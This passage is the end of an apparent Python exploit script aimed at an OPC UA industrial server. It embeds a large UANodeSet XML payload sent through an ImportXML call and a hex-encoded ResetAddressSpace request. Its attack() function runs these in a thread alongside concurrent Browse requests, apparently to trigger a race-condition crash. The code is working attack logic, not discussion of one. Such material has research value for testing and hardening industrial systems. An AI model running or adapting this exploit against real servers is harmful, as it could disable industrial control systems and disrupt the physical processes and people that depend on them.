<Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2065</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2065" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2064" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2064</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2066" BrowseName="0:GetPosition" ParentNodeId="ns=1;i=2051">\n    <DisplayName>GetPosition</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2067</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2068</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2067" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2066" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2066</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2068" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2066" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2066</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2069" BrowseName="0:SetPosition" ParentNodeId="ns=1;i=2051">\n    <DisplayName>SetPosition</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2070</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2070" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2069" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2069</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2071" BrowseName="0:LastUpdateTime" ParentNodeId="ns=1;i=2051" DataType="UtcTime" Historizing="true">\n    <DisplayName>LastUpdateTime</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2072" BrowseName="0:OpenWithMasks" ParentNodeId="ns=1;i=2051">\n    <DisplayName>OpenWithMasks</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2073</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2074</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2073" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2072" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2072</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2074" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2072" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2072</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2075" BrowseName="0:CertificateTypes" ParentNodeId="ns=1;i=2050" ValueRank="1" ArrayDimensions="0" DataType="NodeId" Historizing="true">\n    <DisplayName>CertificateTypes</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2050</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2076" BrowseName="0:ServerCapabilities" ParentNodeId="ns=1;i=2048" ValueRank="1" ArrayDimensions="0" DataType="String" Historizing="true">\n    <DisplayName>ServerCapabilities</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2077" BrowseName="0:SupportedPrivateKeyFormats" ParentNodeId="ns=1;i=2048" ValueRank="1" ArrayDimensions="0" DataType="String" Historizing="true">\n    <DisplayName>SupportedPrivateKeyFormats</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2078" BrowseName="0:MaxTrustListSize" ParentNodeId="ns=1;i=2048" DataType="UInt32" Historizing="true">\n    <DisplayName>MaxTrustListSize</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2079" BrowseName="0:MulticastDnsEnabled" ParentNodeId="ns=1;i=2048" DataType="Boolean" Historizing="true">\n    <DisplayName>MulticastDnsEnabled</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2080" BrowseName="0:UpdateCertificate" ParentNodeId="ns=1;i=2048">\n    <DisplayName>UpdateCertificate</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2081</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2082</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2081" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2080" ValueRank="1" ArrayDimensions="6" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2080</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2082" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2080" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2080</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2083" BrowseName="0:ApplyChanges" ParentNodeId="ns=1;i=2048">\n    <DisplayName>ApplyChanges</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2048</Reference>\n    </References>\n  </UAMethod>\n  <UAMethod NodeId="ns=1;i=2084" BrowseName="0:CreateSigningRequest" ParentNodeId="ns=1;i=2048">\n    <DisplayName>CreateSigningRequest</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2085</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2086</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2085" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2084" ValueRank="1" ArrayDimensions="5" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2084</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2086" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2084" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2084</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2087" BrowseName="0:GetRejectedList" ParentNodeId="ns=1;i=2048">\n    <DisplayName>GetRejectedList</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2088</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2088" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2087" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2087</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n</UANodeSet>\n'
        print("[-] Sending MSG Request - Call ImportXML")
        message = message_header + message_body
        opcua.send_recv(message, 1, should_recv=True)

        # Send ResetAddressSpace
        message_header = opcua.build_opcua_message_header()
        message_body = opcua.build_opcua_message_body(type_id=1, req_id=712)
        message_body += bytes.fromhex(
            "010000000301001100000054616746696c652e4d6574686f645365740301001900000054616746696c652e526573657441646472657373537061636500000000")
        print("[-] Sending MSG Request - ResetAddressSpace x {} times".format(1))
        message = message_header + message_body
        opcua.send_recv(message, 1, should_recv=True)


def attack(server_details):
    _thread.start_new_thread(unified_importxml_resetaddressspace, (server_details,))
    _thread.start_new_thread(unified_browse_objects, (server_details,))
    time.sleep(500)
